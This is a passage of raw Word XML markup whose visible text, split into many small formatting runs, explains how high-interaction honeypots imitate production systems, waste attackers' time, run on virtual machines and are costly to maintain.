      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="71" w:firstLine="710"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1020" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>gh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nteract</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>iti</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>produc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>host a var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>serv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ces</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>herefore,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>acker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>owed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>serv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ces</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>was</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tim</w:t>
      </w:r>
      <w:r>
        <w:t>e. By e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">l </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nes,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be hos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e phys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">l </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ne. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>herefore,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>even</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he honeypot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sed,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be res</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ored</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>qu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ck</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>genera</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gh- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>prov</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>cu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">but </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hey</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are expens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n. If</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ual </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are not ava</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e, one phys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>cal co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
